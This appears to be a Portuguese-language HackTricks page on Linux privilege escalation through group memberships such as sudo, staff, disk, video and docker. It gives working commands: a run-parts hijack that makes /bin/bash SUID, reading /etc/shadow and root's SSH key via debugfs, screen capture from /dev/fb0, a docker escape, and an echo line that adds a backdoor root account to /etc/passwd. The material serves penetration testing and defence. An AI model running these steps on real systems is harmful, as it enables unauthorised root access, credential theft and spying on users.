# Grupos Interessantes - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Grupos Sudo/Admin

### **PE - Method 1**

**Às vezes**, **por padrão (ou porque algum software precisa)** dentro do arquivo **/etc/sudoers** você pode encontrar algumas destas linhas:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Isso significa que **qualquer usuário que pertença ao grupo sudo ou admin pode executar qualquer coisa como sudo**.

Se for esse o caso, para **se tornar root você pode apenas executar**:
```
sudo su
```
### PE - Método 2

Encontre todos os binários suid e verifique se existe o binário **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Se descobrir que o binário **pkexec is a SUID binary** e que você pertence a **sudo** ou **admin**, provavelmente poderá executar binários como sudo usando `pkexec`.\
Isso ocorre porque normalmente esses são os grupos dentro da **polkit policy**. Essa policy basicamente identifica quais grupos podem usar `pkexec`. Verifique com:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Lá você encontrará quais grupos têm permissão para executar **pkexec** e, **por padrão**, em algumas distribuições Linux aparecem os grupos **sudo** e **admin**.

Para **se tornar root você pode executar**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Se você tentar executar **pkexec** e receber este **erro**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Não é porque você não tem permissões, mas porque você não está conectado sem uma GUI**. E existe uma solução alternativa para este problema aqui: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Você precisa de **2 sessões ssh diferentes**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Grupo Wheel

**Às vezes**, **por padrão** dentro do arquivo **/etc/sudoers** você pode encontrar esta linha:
```
%wheel	ALL=(ALL:ALL) ALL
```
Isso significa que **qualquer usuário que pertença ao grupo wheel pode executar qualquer coisa como sudo**.

Se for esse o caso, para **se tornar root você pode simplesmente executar**:
```
sudo su
```
## Grupo shadow

Usuários do **group shadow** podem **ler** o arquivo **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Então, leia o arquivo e tente **crack some hashes**.

Breve observação sobre o estado de bloqueio ao triar hashes:
- Entradas com `!` ou `*` geralmente não permitem login interativo por senha.
- `!hash` geralmente significa que uma senha foi definida e depois bloqueada.
- `*` geralmente significa que nenhuma hash de senha válida foi definida.
Isto é útil para classificar contas mesmo quando o login direto está bloqueado.

## Staff Group

**staff**: Permite que usuários adicionem modificações locais ao sistema (`/usr/local`) sem precisar de privilégios de root (observe que executáveis em `/usr/local/bin` estão na variável PATH de qualquer usuário, e eles podem "sobrescrever" os executáveis em `/bin` e `/usr/bin` com o mesmo nome). Compare com o grupo "adm", que está mais relacionado a monitoramento/segurança. [\[source\]](https://wiki.debian.org/SystemGroups)

Em distribuições Debian, a variável `$PATH` mostra que `/usr/local/` será executado com a maior prioridade, seja você um usuário privilegiado ou não.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Se conseguirmos realizar um hijack em alguns programas em `/usr/local`, é fácil obter root.

Realizar um hijack do programa `run-parts` é uma forma fácil de obter root, porque a maioria dos programas executa um `run-parts` (por exemplo: crontab, no login via ssh).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
ou quando uma nova sessão ssh fizer login.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Grupo disk

Este privilégio é quase **equivalente ao acesso root** pois você pode acessar todos os dados dentro da máquina.

Arquivos:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Observe que, usando debugfs, você também pode **escrever arquivos**. Por exemplo, para copiar `/tmp/asd1.txt` para `/tmp/asd2.txt`, você pode fazer:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
No entanto, se você tentar **escrever arquivos pertencentes ao root** (como `/etc/shadow` ou `/etc/passwd`) você terá um erro "**Permission denied**".

## Grupo video

Usando o comando `w` você pode encontrar **quem está conectado no sistema** e ele mostrará uma saída como a seguinte:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
O **tty1** significa que o usuário **yossi está logado fisicamente** em um terminal na máquina.

O **video group** tem acesso para visualizar a saída da tela. Basicamente você pode observar as telas. Para isso, você precisa **capturar a imagem atual da tela** em dados brutos e obter a resolução que a tela está usando. Os dados da tela podem ser salvos em `/dev/fb0` e você pode encontrar a resolução dessa tela em `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Para **abrir** a **imagem raw** você pode usar o **GIMP**: selecione o arquivo **`screen.raw`** e escolha como tipo de arquivo **Raw image data**:

![](<../../../images/image (463).png>)

Depois altere Width e Height para os usados na tela e experimente diferentes Image Types (e selecione aquele que mostra melhor a tela):

![](<../../../images/image (317).png>)

## Grupo root

Parece que, por padrão, os **membros do grupo root** podem ter acesso para **modificar** alguns arquivos de configuração de **serviço**, alguns arquivos de **bibliotecas** ou **outras coisas interessantes** que podem ser usadas para escalar privilégios...

**Verifique quais arquivos os membros do grupo root podem modificar**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

Você pode montar o root filesystem da máquina host no volume de uma instância, assim quando a instância iniciar ela imediatamente carrega um `chroot` nesse volume. Isso efetivamente lhe dá root na máquina.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Finalmente, se você não gostar de alguma das sugestões anteriores, ou elas não estiverem funcionando por algum motivo (docker api firewall?) você sempre pode tentar **run a privileged container and escape from it** como explicado aqui:


{{#ref}}
../container-security/
{{#endref}}

Se você tem permissões de escrita sobre o docker socket leia [**this post about how to escalate privileges abusing the docker socket**](../index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Grupo lxc/lxd


{{#ref}}
./
{{#endref}}

## Grupo adm

Geralmente os **membros** do grupo **`adm`** têm permissões para **ler arquivos de log** localizados em _/var/log/_.\
Portanto, se você comprometeu um usuário desse grupo você definitivamente deve dar uma **olhada nos logs**.

## Grupos backup / operator / lp / mail

Esses grupos são frequentemente vetores de **credential-discovery** em vez de vetores diretos para root:
- **backup**: pode expor arquivos com configs, keys, DB dumps ou tokens.
- **operator**: acesso operacional específico da plataforma que pode leak dados sensíveis de runtime.
- **lp**: print queues/spools podem conter o conteúdo de documentos.
- **mail**: mail spools podem expor reset links, OTPs e credenciais internas.

Trate a associação aqui como um achado de exposição de dados de alto valor e pivot através de password/token reuse.

## Grupo auth

Dentro do OpenBSD o grupo **auth** normalmente pode escrever nas pastas _**/etc/skey**_ e _**/var/db/yubikey**_ se elas forem usadas.\
Essas permissões podem ser abusadas com o seguinte exploit para **escalate privileges** até root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
